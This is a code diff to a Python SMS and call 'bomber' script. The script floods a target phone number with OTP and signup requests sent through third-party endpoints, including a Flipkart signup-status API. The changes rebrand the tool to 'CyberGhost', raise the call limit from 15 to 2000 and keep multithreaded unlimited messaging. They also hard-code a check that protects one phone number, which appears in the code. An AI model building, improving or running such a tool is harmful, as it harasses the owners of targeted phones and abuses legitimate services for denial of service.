@@ -417,7 +417,7 @@ def getapi(pn, lim, cc):
             'connection': 'keep-alive',
             'Content-Type': 'application/json; charset=utf-8'}
 
-        data = {"loginId": ["+"+cc+pn], "supportAllStates": true}
+        data = {"loginId": ["+"+cc+pn], "supportAllStates": True}
 
         response = requests.post(
             'https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data)
@@ -724,7 +724,7 @@ def start(target, counter, delay, ch, cc):
             api = random.choice(ch)
         except Exception:
             if cc == "91":
-                print('Sorry All APIs Have Expired Please Update EklavyaSingh')
+                print('Sorry All APIs Have Expired Please Update Bomber')
                 input('Press Enter To Exit...')
                 exit()
             else:
@@ -817,7 +817,11 @@ while True:
         cc = ''.join(tc)
         cc = cc.strip()
     pn = input("\tEnter Target Number: +" + cc + " ")
+    if (pn==7870659072):
+        print("U DUMB... HAHAHA U CANT DO THIS TO ME")
+        raise ValueError
     pn = remsp(pn)
+
     if len(cc) >= 4 or len(cc) < 1:
         print('\n\nInvalid Country Code..\n\t\tCountry Codes Are Generally 1-3 digits...\n')
         continue
@@ -837,14 +841,11 @@ except Exception:
     type = 0
 if type == 1:
     nm = int(input("Enter Number of Calls To Send(Maximum 2000): "))
-    if nm == 7870659072:
-        printf("Go To HELLLLLL U CANT DO THIS TO OWNER ")
-        exit()
-    elif nm > 2000:
+    if nm > 2000:
         print("\t\tYou Have Entered " + str(nm) +
-              ".\n\tNormalizing Value To 15")
-        nm = 15
-        dl = float(input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
+              ".\n\tNormalizing Value To 2000")
+        nm = 2000
+    dl = float(input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
 elif type == 0:
     if cc == "91":
         nm = int(input("Enter Number of Messages To Send(0 For Unlimited): "))
@@ -900,7 +901,7 @@ if cbomb:
 if nm == 0:
     nt = int(input("\tNumber Of Threads(10 to 20) : "))
     if nt <= 0 or nt >= 30:
-        print('\tEklavyaSingh Shows Better Result in 10 to 25 Threads\n\t\tStill Continuing....')
+        print('\tCyberGhostWeapon Shows Better Result in 10 to 25 Threads\n\t\tStill Continuing....')
     print("\n\nPlease Remember That This Is in Experimental Stage And Is Incredibly Fast...")
     t = [None] * nt
     print(random.choice(colors))
@@ -913,7 +914,7 @@ if nm == 0:
     print("             Delay               : ", dl)
     print("==================================================================")
     print("              Use this for fun, not for revenge !!                ")
-    print("              This Bomber Was Created By Eklavya Singh !        ")
+    print("              This Bomber Was Created By CyberGhost !        ")
     print("==================================================================")
     print(W)
     input('\n\nPress CTRL+Z To STOP Bomber... \nPress Enter To Start Bomber...\n')
